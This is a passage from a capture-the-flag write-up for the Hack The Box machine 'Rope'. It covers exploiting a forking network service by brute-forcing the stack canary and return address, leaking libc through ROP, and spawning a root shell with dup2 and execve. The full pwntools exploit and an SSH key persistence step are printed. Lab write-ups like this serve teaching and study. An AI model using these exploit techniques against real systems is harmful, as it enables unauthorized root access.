drwx------ 2 root root 4096 Jun 19 19:06 run
drwxr-x--- 2 root adm  4096 Jun 19 16:11 support
drwxr-xr-x 7 root root 4096 Jun 20 07:27 www

```

The file is a 64-bit ELF, stripped:

```

r4j@rope:/opt/support$ file contact 
contact: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=cc3b330cabc203d0d813e3114f1515b044a1fd4f, stripped

```

I can `nc` to port 1337, and there’s a single prompt, I give input, then it prints done and exits:

```

r4j@rope:/opt/support$ nc localhost 1337
Please enter the message you want to send to admin:
this is a test
Done.

```

I’ll also notice that if I send a longer string (say, 100 As), I don’t get the done message, potentially because it crashed:

```

r4j@rope:/opt/support$ nc localhost 1337
Please enter the message you want to send to admin:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

```

### Reversing

I’ll open the application in IDA again. Just like in `httpserver`, in `main` find an `accept` call, followed by a function that I can guess (and I’m right) will call `fork`, and return 0 for the parent, which comes back here, takes the jump, closes the new file handle, and loops back to `accept` again, or 1 for the child, which processes the socket and exits.

![1567197951580](https://0xdfimages.gitlab.io/img/1567197951580.png)

Jumping into the function, there is a `fork` call, and the child process has a single block of code:

[![Code handling user input](https://0xdfimages.gitlab.io/img/1567250666902.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1567250666902.png)

It’s not clear to me why the author uses `write` to send the first message to the socket, and `send` for the second message. Either way, the information I send back must be processed in `sub_159A`.

`sub_159A` is a simple function that just calls `recv` into a buffer and returns:

![1567251146070](https://0xdfimages.gitlab.io/img/1567251146070.png)

Things to note:
- Only 80 bytes of space are created on the stack at the start (`sub rsp, 50h`), and less than that are devoted to the buffer my input goes into. On the other hand, the `recv` function is passed `0x400` as the number of bytes to read. This is a clear opportunity for buffer overflow.
- There’s a clear canary check at the end. This checks a value on the stack against a copy of that same value from the start of the function the ensure it’s still the same. To overwrite the return address, I need to know the canary so it doesn’t change, or the program dies before it can return.

Now seems like a good time to check out what other protections are in place. I’ll attach `gdb` just like [above](#general-notes) and run `checksec`:

```

gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial

```

### Strategy

This will be a simple ROP exploit, where I chain together gadgets, or small snippets of code that each move one or two pieces into place and return to the next one. To do this I’ll need some gadgets. I’ll also need a way to leak the canary, as well as the address space for the program, since PIE is enabled.

Much like the `httpserver` exploit, this took a long time of playing around, debugging, setting break points, examining memory, etc to get working. It’s hard to show all that, but doing it is how you get better at it.

### Stage 0: Brute force Canary (and RBP and return address)

In order to overflow the buffer and write a new return address, I’ll need to know the canary value, which is randomly selected each time the server starts. Luckily for me, this doesn’t change when a new process is forked to handle my request. Also, when I send a bad canary value, I know the program just shuts down on me, as opposed to sending “Done.” when the canary is intact.

#### Find Offset

Before reading my input, the end of the stack looks like:

```

gdb-peda$ x/3xg $rbp-8
0x7ffccfb6cbe8: 0x18bb289986192300      0x00007ffccfb6cc20
0x7ffccfb6cbf8: 0x000055d9d3d0d562

```

That’s the canary, then the `rbp` value from the previous frame, and the return address.

I’ll use `pattern_create` from peda to get 100 characters, and submit it to the program:

```

root@kali# echo 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL' | nc 127.0.0.1 1337                                                  
Please enter the message you want to send to admin:

```

Now I’ll run until just after the `recv`, and check out the same three locations:

```

gdb-peda$ x/3xg $rbp-8
0x7ffccfb6cbe8: 0x4841413241416341      0x4141334141644141
0x7ffccfb6cbf8: 0x4134414165414149

```

I’ll use `pattern_offset` to get the distance to the canary:

```

gdb-peda$ pattern_offset 0x4841413241416341
5206514328315978561 found at offset: 56

```

I can show this by sending 56 characters into the program (55 As and a `\n`), and getting “Done.”, but then sending 57 (56 As and a `\n`), and not:

```

root@kali# python -c 'print "A"*55' | nc 127.0.0.1 1337
Please enter the message you want to send to admin:
Done.
root@kali# python -c 'print "A"*56' | nc 127.0.0.1 1337
Please enter the message you want to send to admin:

```

#### Brute Force Canary

Now I can use this to brute force the canary value. I can send 256 requests, each with 56 bytes of junk and a unique 57th byte. That 57th byte will overwrite the low byte of the canary (which is always 00). The 255 non-zero requests will return no additional data, or an end of file if I try to read from the socket. The request with 56 bytes of junk + ‘0x00’ will return “Done.”. I can do that same for the next 7 bytes to get the full canary. Now I can overwrite the canary and continue on to overwrite the return address.

#### Brute Force RBP and Return

I can use almost the exact same tactic to brute force the next two words. The return value will be particularly useful, as it will give me a leak to calculate the memory space for the program, so I can use rop gadgets from it.

There is an additional challenge with these two. What if there are more than one byte that makes them valid? This really only applies to the low byte. But think about the return address. If it returns one instruction later, will it crash? Not necessarily. To get around this, I’ll hardcode the least significant byte for the return address. For RBP, I don’t really care, since any working value will allow me to overwrite it, and I’m not going to use the address for any calculations.

#### Code

My code for this brute force looks like this:

```

def get_next_byte(s, r):

    for i in r:
        p = remote(host,port)
        p.recvuntil("Please enter the message you want to send to admin:\n")
        try:
            p.send(s + i.to_bytes(1,'big'))
            p.recvuntil('Done.', timeout=2)
            p.close()
            return i.to_bytes(1,'big')
        except EOFError:
            p.close()
    import pdb   # Shouldn't get here
    pdb.set_trace()
    print("Failed to find byte")

def brute_word(buff, num_bytes, obj, assumed=b''):

    start = time.time()
    result = assumed
    with log.progress(f'Brute forcing {obj}') as p:
        for i in range(num_bytes):
            current = '0x' + ''.join([f'{x:02x}' for x in result[::-1]]).rjust(16,'_')
            p.status(f'Found {len(result)} bytes: {current}')
            byte = None
            context.log_level = 'error'  # Hide "Opening connection" and "Closing connection" messages
            while byte == None:          # If no byte found, over range again
                byte = get_next_byte(buff + result, range(0,255))
            result = result + byte
            context.log_level = 'info'   # Re-enable logging
        p.success(f'Finished in {time.time() - start:.2f} seconds')

    log.success(f"{obj}:".ljust(20,' ') + f"0x{u64(result):016x}")
    return result

```

In `get_next_byte`, for each byte, it opens a connection, sends the overflow, and if it succeeds in getting back the message, it returns the byte. Otherwise it tries the next byte. `brute_word` just handles looping over a given number of bytes until it gets a full word.

Because I’m using Python3, I have to be careful with how I handle bytes coming from an int. It’s tempting to do something like `chr(i).encode()`, which works with lower numbers:

```

>>> chr(80).encode()
b'P'
>>> chr(127).encode()
b'\x7f'

```

However, for any character non-ascii (128 or greater), it adds a second byte:

```

>>> chr(253).encode()
b'\xc3\xbd'

```

`i.to_bytes(1,'big')` works, where the endian can be `big` or `little`, since it’s only one byte.

```

>>> x = 127; x.to_bytes(1,'big')
b'\x7f'
>>> x = 253; x.to_bytes(1,'big')
b'\xfd'

```

I also had fun playing with `log.progress`. It allows me to make a live updating line during the loop:

![](https://0xdfimages.gitlab.io/img/rope-brute.gif)

I’ll call `brute_word` with this code:

```

### Stage 0: Brute force addresses
log.info("Starting brute force")
exploit = b"A"*56
canary = brute_word(exploit, 8, 'Canary')
#canary = p64(0xc3c00f67449ca300)
exploit += canary

rbp = brute_word(exploit, 8, 'RBP')
#rbp = p64(0x00007ffdf7d5285c)
exploit += rbp

ret = brute_word(exploit, 7, 'Return Address', b'\x62')
#ret = p64(0x0000556ff9dd4562)

```

The canary and RBP brute force without issue. There is a problem with the return address in that many least significant bytes will not crash the program immediately. But I need to know this address to find the base of the program. Luckily, I can know it will always be 0x62 (more on that in a minute), so I force that here.

This brute forcing is slow. During testing, once I brute forced it once and knew it hadn’t changed, I would often comment out those parts and hard code in these words. Since solving Rope, I learned a bit about Async programming in Python, and may at some point write a post implementing those techniques to solve this significantly faster.

### Stage 1: Leak Libc

Now I know the memory space of the main program, but not the libc. I also know the canary and can overwrite the return address. I’ll use a rop chain to leak a libc address, and then can calculate the addresses of any functions or strings in libc I want. In the program, it uses `write` to send data to the socket. I’ll use a `write` call to send the GOT table address for the `write` function.

#### Program Base Address

Because PIE is enabled it means that even if my gadgets are in the main program, they still move around in memory.

I’ll use my leaked return address to find the offset to the program base. The return address I leak will always be the same distance into that memory space. So I can simply look at that address and the memory map, and calculate the offset.

```

gdb-peda$ x/3xg $rbp-8
0x7ffccfb6cbe8: 0x18bb289986192300      0x00007ffccfb6cc20
0x7ffccfb6cbf8: 0x000055d9d3d0d562
gdb-peda$ info proc mappings
process 20559
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x55d9d3d0c000     0x55d9d3d0d000     0x1000        0x0 /media/sf_CTFs/hackthebox/rope-10.10.10.148/contact
      0x55d9d3d0d000     0x55d9d3d0e000     0x1000     0x1000 /media/sf_CTFs/hackthebox/rope-10.10.10.148/contact
      0x55d9d3d0e000     0x55d9d3d0f000     0x1000     0x2000 ...[snip]...

```

I can see here that the return address is 0x000055d9d3d0d562, and base address is 0x55d9d3d0c000, so the offset is 0x1562. And because that offset is always the same, and the base address will always end in 0x00, I can know that the least significant byte is always 0x62 (which is what I used above).

So now I can calculate for any run that the base address will be the leaked address minus 0x1562.

#### Get Gadgets

I’ll need gadgets that allow me to set `rdi`, `rsi`, and `rdx`, as well as the GOT address for `write` to leak, and the `PLT` address for `write` to call. I’ll get gadgets by typing `rop` at the `gdb-peda$`  prompt:

```

gdb-peda$ rop                                                     
Gadgets information                                                                            
============================================================                                                 
0x00000000000011d3 : add byte ptr [rax], 0 ; add byte ptr [rax], al ; ret
0x00000000000011d4 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
...[snip]...
0x000000000000124f : pop rbp ; ret
0x000000000000164b : pop rdi ; ret   <-- rdi
0x0000000000001265 : pop rdx ; ret   <-- rdx
0x0000000000001649 : pop rsi ; pop r15 ; ret   <-- rsi (if I don't mind stomping r15)
0x0000000000001645 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000001016 : ret
0x0000000000001072 : ret 0x2f
...[snip]...

```

I can grab the offsets to the three I need, and add the base address to get their address.

#### write GOT and PLT

The GOT address will hold the address of `write` in libc as it’s loaded. That’s what I want to leak. The PLT is the table of code that contains the stubs to call the dynamic linker. So the first time a function is called, the GOT jump right back to the PLT which calls the linker. The linker updates the GOT so the next time it’s called, it goes right to the function in libc. The PLT address will be constant relative to the program base. Since I already leaked that, I will be able to call this. I just need to know the offset. In this case, I can see it by disassembling some of the code:

```

gdb-peda$ x/10i 0x55d9d3d0d546
   0x55d9d3d0d546:      lea    esi,[rip+0x2b94]        # 0x55d9d3d100e0
   0x55d9d3d0d54c:      mov    edi,eax
   0x55d9d3d0d54e:      call   0x55d9d3d0d050 <write@plt>
   0x55d9d3d0d553:      mov    eax,DWORD PTR [rbp-0x14]
   0x55d9d3d0d556:      mov    edi,eax
   0x55d9d3d0d558:      mov    eax,0x0
   0x55d9d3d0d55d:      call   0x55d9d3d0d59a
=> 0x55d9d3d0d562:      mov    eax,DWORD PTR [rbp-0x14]
   0x55d9d3d0d565:      mov    ecx,0x0
   0x55d9d3d0d56a:      mov    edx,0x6
gdb-peda$ disassemble 0x55d9d3d0d050
Dump of assembler code for function write@plt:
   0x000055d9d3d0d050 <+0>:     jmp    QWORD PTR [rip+0x2fd2]        # 0x55d9d3d10028 <write@got.plt>
   0x000055d9d3d0d056 <+6>:     push   0x2
   0x000055d9d3d0d05b <+11>:    jmp    0x55d9d3d0d020
End of assembler dump.

```

The PLT address of `write` is 0x000055d9d3d0d050. I can subtract off the base I calculated earlier to get the offset:

```

gdb-peda$ p 0x000055d9d3d0d050-0x55d9d3d0c000
$4 = 0x1050

```

I can also calculate the GOT offset from the base address here as well:

```

gdb-peda$ p 0x55d9d3d10028 - 0x55d9d3d0c000
$5 = 0x4028

```

Finally, I need the file descriptor to write to. When I run locally, I see it it starts listening on fd 3, and new child connections start on 4:

```

root@kali# ./contact
listen on port 1337, fd is 3
[+] Request accepted fd 4, pid 0
[+] Request accepted fd 4, pid 0

```

So I’ll write to 4.

#### Code

Putting all of that together, I can write the following code:

```

### Stage 1: Leak libc
# Gadgets
prog_base = u64(ret) - 0x1562
pop_rdi_ret = p64(0x164b + prog_base)
pop_rsi_r15_ret = p64(0x1649 + prog_base)
pop_rdx_ret = p64(0x1265 + prog_base)
write = p64(0x1050 + prog_base)
write_got = p64(0x4028 + prog_base)

junk = b"A"*56
exploit =  junk + canary + rbp

# write(4, write_got, 8)
exploit += pop_rdi_ret
exploit += p64(4)
exploit += pop_rsi_r15_ret
exploit += write_got
exploit += p64(0)
exploit += pop_rdx_ret
exploit += p64(8)
exploit += write

log.info("Sending exploit to leak libc write address")
p = remote(host, port)
p.recvuntil("Please enter the message you want to send to admin:\n")
p.send(exploit)
libc_write = p.recv(8, timeout=300)
log.success(f"libc write address: 0x{u64(libc_write):016x}")
p.close()

```

Before this code, `exploit` consists of junk, the canary, and rbp. So I start a rop chain with the gadgets to call `write`. When I send it, I get back the libc address of `write`.

### Stage 2: Shell

Now with the libc address known, I can write a rop chain that will give me execution. The commands used to get the offsets are shown in comments below, run both locally and on Rope:

```

### Stage 2: Shell
# build rop

if target == 'local':
# readelf -s /usr/lib/x86_64-linux-gnu/libc-2.28.so | grep -e " dup2@@GLIBC" -e " execve@@GLIBC" -e " write@@GLIBC"
#1010: 00000000000eabf0    33 FUNC    WEAK   DEFAULT   13 dup2@@GLIBC_2.2.5
#1506: 00000000000c6a00    33 FUNC    WEAK   DEFAULT   13 execve@@GLIBC_2.2.5
#2267: 00000000000ea4f0   153 FUNC    WEAK   DEFAULT   13 write@@GLIBC_2.2.5
# strings -a -t x /usr/lib/x86_64-linux-gnu/libc-2.28.so | grep /bin/sh
# 181519 /bin/sh
    dup2_offset   = 0xeabf0
    execve_offset = 0xc6a00
    write_offset  = 0xea4f0
    binsh_offset  = 0x181519

else:
# readelf -s libc.so.6_ | grep -e " dup2@@GLIBC" -e " execve@@GLIBC" -e " write@@GLIBC"
#   999: 00000000001109a0    33 FUNC    WEAK   DEFAULT   13 dup2@@GLIBC_2.2.5
#  1491: 00000000000e4e30    33 FUNC    WEAK   DEFAULT   13 execve@@GLIBC_2.2.5
#  2246: 0000000000110140   153 FUNC    WEAK   DEFAULT   13 write@@GLIBC_2.2.5
# strings -a -t x libc.so.6_  | grep /bin/sh
# 1b3e9a /bin/sh
    dup2_offset   = 0x1109a0
    execve_offset = 0xe4e30
    write_offset  = 0x110140
    binsh_offset  = 0x1b3e9a

libc_base = u64(libc_write) - write_offset
dup2 = p64(libc_base + dup2_offset)
binsh = p64(libc_base + binsh_offset)
execve = p64(libc_base + execve_offset)
log.success("Calculated addresses:")
print(f"    libc_base:          0x{libc_base:016x}")
print(f"    dup2:               0x{u64(dup2):016x}")
print(f"    execve:             0x{u64(execve):016x}")
print(f"    binsh:              0x{u64(binsh):016x}")

exploit =  junk + canary + rbp

# dup2(4,0)
exploit += pop_rdi_ret
exploit += p64(4)
exploit += pop_rsi_r15_ret
exploit += p64(0)
exploit += p64(0)
exploit += dup2

# dup2(4,1)
exploit += pop_rdi_ret
exploit += p64(4)
exploit += pop_rsi_r15_ret
exploit += p64(1)
exploit += p64(1)
exploit += dup2

# dup2(4,2)
exploit += pop_rdi_ret
exploit += p64(4)
exploit += pop_rsi_r15_ret
exploit += p64(2)
exploit += p64(2)
exploit += dup2

# execve("/bin/sh", 0, 0)
exploit += pop_rdi_ret
exploit += binsh
exploit += pop_rsi_r15_ret
exploit += p64(0)
exploit += p64(0)
exploit += pop_rdx_ret
exploit += p64(0)
exploit += execve

time.sleep(1)
log.info("Sending shell exploit")
p = remote(host, port)
p.recvuntil("Please enter the message you want to send to admin:\n")
p.send(exploit)
p.interactive()
p.close()

```

#### Test Locally

First I tested locally, and it worked:

```

root@kali# python3 rope_root-remote3.py local
[*] Starting brute force
[+] Brute forcing Canary: Finished in 147.60 seconds
[+] Canary:             0x2dc703f3464e4300
[+] Brute forcing RBP: Finished in 188.66 seconds
[+] RBP:                0x00007ffec5a79900
[+] Brute forcing Return Address: Finished in 85.28 seconds
[+] Return Address:     0x0000557c214f5562
[*] Sending exploit to leak libc write address
[+] Opening connection to 127.0.0.1 on port 1337: Done
[+] libc write address: 0x00007fc4383a87d0
[*] Closed connection to 127.0.0.1 port 1337
[+] Calculated addresses:
    libc_base:          0x00007fc4382bd000
    dup2:               0x00007fc4383a8f00
    execve:             0x00007fc438384d60
    binsh:              0x00007fc438440cee
[*] Sending shell exploit
[+] Opening connection to 127.0.0.1 on port 1337: Done
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)

```

#### Shell Remotely

In order to talk to the service running on Rope, I need access from localhost. I could upload my script and try to run it there, but it’ll be easier to use my current access to enable ssh access since ssh is running. I’ll write my public key into `authorized_keys`:

```

john@rope:/home/john$ mkdir .ssh
john@rope:/home/john$ cd .ssh
john@rope:/home/john/.ssh$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0SwpwZ7rgMtCZYzkDtFJvQZO20N+8DmYxOix+PgL6VQW/9wZC3xnKK1zeAelMYtv/O38GXE2ghUH7z6ayVmTMkjGqt18mhsEpCt0BbonGRC0IHoBsV5QBVNin+x1soVdECT1Tr45bNnTnkZXIgSyDumc+2Ix6A1wiiC5RbI3SrxJ7nL0lRlhjdoAH6KCb4dwhX+Jos0VudHRreE01+0YE0Qb7Sd0eA5Cq7UtjgiW6VyXcmWH7aQdVZlUanrs5wdwWYeVCxY/XfFCCDmHZw+8W5INudM2t7on7bl/rYnhAExOr14/1s7LfYAfV8B6VNPPX+IOzOcT4aYQC3rRDiG5P root@kali' > authorized_keys

```

Now ssh in with `-L 1337:localhost:1337` will allow me to hit 1337 on my local box and it will forward to 1337 on Rope.

```

root@kali# ssh -i ~/id_rsa_generated john@10.10.10.148 -L 1337:localhost:1337
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-52-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Aug 31 20:56:07 UTC 2019

  System load:  0.13               Processes:            172
  Usage of /:   28.3% of 14.70GB   Users logged in:      0
  Memory usage: 9%                 IP address for ens33: 10.10.10.148
  Swap usage:   0%

152 packages can be updated.
72 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat Aug 31 20:55:56 2019 from 10.10.14.5
john@rope:~$

```

Now I can run for the remote target, with the same IP/port (because 127.0.0.1:1337 now points to the SSH tunnel, not a local copy of the server), just different offsets. It took just under 15 minutes to run, but it results in a shell:

```

root@kali# python3 rope_root-remote3.py remote
[*] Starting brute force
[+] Brute forcing Canary: Finished in 320.63 seconds
[+] Canary:             0x0d29f2c7dd531f00
[+] Brute forcing RBP: Finished in 335.70 seconds
[+] RBP:                0x00007ffe4683ca60
[+] Brute forcing Return Address: Finished in 238.71 seconds
[+] Return Address:     0x000055a54dd75562
[*] Sending exploit to leak libc write address
[+] Opening connection to 127.0.0.1 on port 1337: Done
[+] libc write address: 0x00007fea834b9140
[*] Closed connection to 127.0.0.1 port 1337
[+] Calculated addresses:
    libc_base:          0x00007fea833a9000
    dup2:               0x00007fea834b99a0
    execve:             0x00007fea8348de30
    binsh:              0x00007fea8355ce9a
[*] Sending shell exploit
[+] Opening connection to 127.0.0.1 on port 1337: Done
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)

```

And grab `root.txt`:

```

$ cat root.txt
1c773343************************

```

The full exploit source code is:

```

#!/usr/bin/env python3

import sys
import time
from pwn import *
import pdb

def get_next_byte(s, r):

    for i in r:
        p = remote(host,port)
        p.recvuntil("Please enter the message you want to send to admin:\n")
        try:
            p.send(s + i.to_bytes(1,'big'))
            p.recvuntil('Done.', timeout=2)
            p.close()
            return i.to_bytes(1,'big')
        except EOFError:
            p.close()
    import pdb
    pdb.set_trace()
    print("Failed to find byte")

def brute_word(buff, num_bytes, obj, assumed=b''):

    start = time.time()
    result = assumed
    with log.progress(f'Brute forcing {obj}') as p:
        for i in range(num_bytes):
            current = '0x' + ''.join([f'{x:02x}' for x in result[::-1]]).rjust(16,'_')
            p.status(f'Found {len(result)} bytes: {current}')
            byte = None
            context.log_level = 'error'  # Hide "Opening connection" and "Closing connection" messages
            while byte == None:          # If no byte found, over range again
                byte = get_next_byte(buff + result, range(0,255))
            result = result + byte
            context.log_level = 'info'   # Re-enable logging
        p.success(f'Finished in {time.time() - start:.2f} seconds')

    log.success(f"{obj}:".ljust(20,' ') + f"0x{u64(result):016x}")
    return result

if len(sys.argv) != 2 or sys.argv[1] not in ['local','remote']:
    print("Usage: %s [target]\ntarget is local or remote\n" % sys.argv[0])
    sys.exit(1)
target = sys.argv[1]

elf = context.binary = ELF('./contact', checksec=False)
host = '127.0.0.1'
port = 1337

### Stage 0: Brute force addresses
log.info("Starting brute force")
exploit = b"A"*56
canary = brute_word(exploit, 8, 'Canary')
#canary = p64(0xc3c00f67449ca300)
exploit += canary

rbp = brute_word(exploit, 8, 'RBP')
#rbp = p64(0x00007ffdf7d5285c)
exploit += rbp

ret = brute_word(exploit, 7, 'Return Address', b'\x62')
#ret = p64(0x0000556ff9dd4562)

### Stage 1: Leak libc
# Gadgets
prog_base = u64(ret) - 0x1562
pop_rdi_ret = p64(0x164b + prog_base)
pop_rsi_r15_ret = p64(0x1649 + prog_base)
pop_rdx_ret = p64(0x1265 + prog_base)
write = p64(0x1050 + prog_base)
write_got = p64(0x4028 + prog_base)

junk = b"A"*56
exploit =  junk + canary + rbp

# write(4, write_got, 8)
exploit += pop_rdi_ret
exploit += p64(4)
exploit += pop_rsi_r15_ret
exploit += write_got
exploit += p64(0)
exploit += pop_rdx_ret
exploit += p64(8)
exploit += write

log.info("Sending exploit to leak libc write address")
p = remote(host, port)
p.recvuntil("Please enter the message you want to send to admin:\n")
p.send(exploit)
libc_write = p.recv(8, timeout=300)
log.success(f"libc write address: 0x{u64(libc_write):016x}")
p.close()

### Stage 2: Shell
# build rop

if target == 'local':
# readelf -s /lib/x86_64-linux-gnu/libc-2.29.so | grep -e " dup2@@GLIBC" -e " execve@@GLIBC" -e " write@@GLIBC"
#  1011: 00000000000ebf00    33 FUNC    WEAK   DEFAULT   14 dup2@@GLIBC_2.2.5
#  1509: 00000000000c7d60    33 FUNC    WEAK   DEFAULT   14 execve@@GLIBC_2.2.5
#  2271: 00000000000eb7d0   153 FUNC    WEAK   DEFAULT   14 write@@GLIBC_2.2.5
# strings -a -t x /lib/x86_64-linux-gnu/libc-2.29.so | grep /bin/sh
# 183cee /bin/sh
    dup2_offset   = 0xebf00
    execve_offset = 0xc7d60
    write_offset  = 0xeb7d0
    binsh_offset  = 0x183cee

else:
# readelf -s libc.so.6_ | grep -e " dup2@@GLIBC" -e " execve@@GLIBC" -e " write@@GLIBC"
#   999: 00000000001109a0    33 FUNC    WEAK   DEFAULT   13 dup2@@GLIBC_2.2.5
#  1491: 00000000000e4e30    33 FUNC    WEAK   DEFAULT   13 execve@@GLIBC_2.2.5
#  2246: 0000000000110140   153 FUNC    WEAK   DEFAULT   13 write@@GLIBC_2.2.5
# strings -a -t x libc.so.6_  | grep /bin/sh
# 1b3e9a /bin/sh
    dup2_offset   = 0x1109a0
    execve_offset = 0xe4e30
    write_offset  = 0x110140
    binsh_offset  = 0x1b3e9a

libc_base = u64(libc_write) - write_offset
dup2 = p64(libc_base + dup2_offset)
binsh = p64(libc_base + binsh_offset)
execve = p64(libc_base + execve_offset)
log.success("Calculated addresses:")
print(f"    libc_base:          0x{libc_base:016x}")
print(f"    dup2:               0x{u64(dup2):016x}")
print(f"    execve:             0x{u64(execve):016x}")
print(f"    binsh:              0x{u64(binsh):016x}")

exploit =  junk + canary + rbp

# dup2(4,0)
exploit += pop_rdi_ret
exploit += p64(4)
exploit += pop_rsi_r15_ret
exploit += p64(0)
exploit += p64(0)
exploit += dup2

# dup2(4,1)
exploit += pop_rdi_ret
exploit += p64(4)
exploit += pop_rsi_r15_ret
exploit += p64(1)
exploit += p64(1)
exploit += dup2

# dup2(4,2)
exploit += pop_rdi_ret
exploit += p64(4)
exploit += pop_rsi_r15_ret
exploit += p64(2)
exploit += p64(2)
exploit += dup2

# execve("/bin/sh", 0, 0)
exploit += pop_rdi_ret
exploit += binsh
exploit += pop_rsi_r15_ret
exploit += p64(0)
exploit += p64(0)
exploit += pop_rdx_ret
exploit += p64(0)
exploit += execve

time.sleep(1)
log.info("Sending shell exploit")
p = remote(host, port)
p.recvuntil("Please enter the message you want to send to admin:\n")
p.send(exploit)
p.interactive()
p.close()

```